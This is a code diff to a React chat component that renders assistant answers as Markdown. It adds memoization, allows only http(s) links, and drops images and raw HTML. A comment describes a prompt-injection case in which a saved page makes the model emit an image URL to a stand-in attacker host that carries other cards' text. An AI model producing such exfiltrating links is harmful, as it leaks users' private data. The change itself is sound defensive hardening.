@@ -1,12 +1,13 @@
 'use client';
 
-import { useState, useRef, useEffect, useMemo, useCallback } from 'react';
+import { useState, useRef, useEffect, useMemo, useCallback, memo } from 'react';
 import { ArrowUp, Plus, MessagesSquare, Copy, Check, TriangleAlert, RefreshCw, Square, RotateCcw, ArrowDown, X, ChevronLeft, Waypoints, Image as ImageIcon, StickyNote, Bookmark, BookmarkCheck, Share2 } from 'lucide-react';
 import type { OrbState } from '@/components/ui/CitationMark';
-import ReactMarkdown from 'react-markdown';
+import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remarkBreaks from 'remark-breaks';
 import { getDominantDirection } from '@/lib/rtl';
+import { isHttpUrl } from '@/lib/url';
 import { breakIntoParagraphs, normalizeListMarkers } from '@/lib/answerLayout';
 import SourceByline from '@/components/SourceByline';
 import { linkPlatform, platformIcon, platformColor, screenshotSource } from '@/lib/platform';
@@ -48,9 +49,54 @@ function meaningfulName(name?: string | null): string | null {
 // to live here (platform label + boxed brand logo) was the last copy of that
 // logic outside SourceByline, and it drifted, which is what this replaced.
 
-/** Renders an assistant answer as Markdown, styled to match the chat. GFM gives
- *  us tables/strikethrough; remark-breaks turns single newlines into <br> so the
- *  model's line breaks survive (like the old whitespace-pre-wrap).
+/** Hoisted so a render never hands ReactMarkdown a fresh array. GFM gives us
+ *  tables/strikethrough; remark-breaks turns single newlines into <br> so the
+ *  model's line breaks survive (like the old whitespace-pre-wrap). */
+const ANSWER_REMARK_PLUGINS = [remarkGfm, remarkBreaks];
+
+/** An answer never renders an image. Answers are written from saved pages, so
+ *  an instruction planted in one can make the model emit
+ *  `![](https://attacker/?d=<other cards' text>)`, and a rendered <img> would
+ *  send that URL the moment the answer appears, with no click (the CSP allows
+ *  any https image). Dropped outright, not unwrapped: an image's alt text is
+ *  the same attacker's text. Raw HTML is skipped for the same reason. */
+const ANSWER_DISALLOWED = ['img'];
+
+/** One component map per direction, built once at module load rather than per
+ *  render. Every heading level maps to ONE modest size: a model's # choice must
+ *  never shout inside a chat bubble. */
+function answerComponents(dir: 'rtl' | 'ltr'): Components {
+    return {
+        // Mini-subheadings the structure prompt asks for on long answers.
+        h1: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        h2: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        h3: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        h4: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
+        p: ({ children }) => <p dir={dir} className="mb-2 last:mb-0">{children}</p>,
+        ul: ({ children }) => <ul dir={dir} className="list-disc ps-5 mb-2 last:mb-0 space-y-1">{children}</ul>,
+        ol: ({ children }) => <ol dir={dir} className="list-decimal ps-5 mb-2 last:mb-0 space-y-1">{children}</ol>,
+        li: ({ children }) => <li dir={dir} className="leading-relaxed">{children}</li>,
+        strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
+        // Only http(s) opens anything. The default URL transform already
+        // blanks javascript: and friends; this also keeps mailto:, relative
+        // and in-app paths from becoming tappable in the native shell, where
+        // a relative href would navigate the app itself.
+        a: ({ children, href }) => isHttpUrl(href) ? (
+            <a href={href} target="_blank" rel="noopener noreferrer" className="text-accent underline underline-offset-2 hover:text-accent-hover">
+                {children}
+            </a>
+        ) : <span>{children}</span>,
+        code: ({ children }) => <code className="px-1 py-0.5 rounded bg-card-hover text-[13px] font-mono">{children}</code>,
+    };
+}
+const ANSWER_COMPONENTS = { ltr: answerComponents('ltr'), rtl: answerComponents('rtl') };
+
+/** Renders an assistant answer as Markdown, styled to match the chat.
+ *
+ *  Memoized on (content, dir): Ask re-renders on every keystroke and every
+ *  streamed token, and re-parsing every earlier answer each time cost 50-90ms
+ *  per render in a 15-30 answer chat. Only the answer that is still writing
+ *  re-parses now.
  *
  *  Direction: every block carries ONE direction for the whole message — NOT
  *  per-block `dir="auto"` (first-strong detection flipped any English bullet
@@ -62,42 +108,25 @@ function meaningfulName(name?: string | null): string | null {
  *  question answered in Hebrew must still render RTL). The QUESTION's
  *  direction (`dir` prop) is only the fallback for title-only/neutral
  *  content. */
-function MarkdownMessage({ content, dir: dirProp }: { content: string; dir?: 'rtl' | 'ltr' }) {
+const MarkdownMessage = memo(function MarkdownMessage({ content, dir: dirProp }: { content: string; dir?: 'rtl' | 'ltr' }) {
     const dir = getDominantDirection(content, dirProp ?? 'ltr');
+    // Two normalisations, both deterministic and text-preserving: stray list
+    // markers become real markdown, and a long answer the model returned as
+    // one unbroken block gets paragraph breaks (see lib/answerLayout — the
+    // prompt has asked for this since July and the model still doesn't
+    // always comply). Answers the model DID format pass through untouched.
+    const source = useMemo(() => breakIntoParagraphs(normalizeListMarkers(content)), [content]);
     return (
         <ReactMarkdown
-            remarkPlugins={[remarkGfm, remarkBreaks]}
-            components={{
-                // Mini-subheadings the structure prompt asks for on long
-                // answers. Every heading level maps to ONE modest size — a
-                // model's # choice must never shout inside a chat bubble.
-                h1: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                h2: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                h3: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                h4: ({ children }) => <h4 dir={dir} className="text-[15px] font-bold text-text mt-3 mb-1 first:mt-0">{children}</h4>,
-                p: ({ children }) => <p dir={dir} className="mb-2 last:mb-0">{children}</p>,
-                ul: ({ children }) => <ul dir={dir} className="list-disc ps-5 mb-2 last:mb-0 space-y-1">{children}</ul>,
-                ol: ({ children }) => <ol dir={dir} className="list-decimal ps-5 mb-2 last:mb-0 space-y-1">{children}</ol>,
-                li: ({ children }) => <li dir={dir} className="leading-relaxed">{children}</li>,
-                strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
-                a: ({ children, href }) => (
-                    <a href={href} target="_blank" rel="noopener noreferrer" className="text-accent underline underline-offset-2 hover:text-accent-hover">
-                        {children}
-                    </a>
-                ),
-                code: ({ children }) => <code className="px-1 py-0.5 rounded bg-card-hover text-[13px] font-mono">{children}</code>,
-            }}
+            remarkPlugins={ANSWER_REMARK_PLUGINS}
+            components={ANSWER_COMPONENTS[dir]}
+            disallowedElements={ANSWER_DISALLOWED}
+            skipHtml
         >
-            {/* Two normalisations, both deterministic and text-preserving:
-                stray list markers become real markdown, and a long answer the
-                model returned as one unbroken block gets paragraph breaks (see
-                lib/answerLayout — the prompt has asked for this since July and
-                the model still doesn't always comply). Answers the model DID
-                format pass through both untouched. */}
-            {breakIntoParagraphs(normalizeListMarkers(content))}
+            {source}
         </ReactMarkdown>
     );
-}
+});
 
 /** The shared look of every affordance under an answer: quiet, muted, and on
  *  desktop revealed by hovering the message (mobile has no hover, so they stay
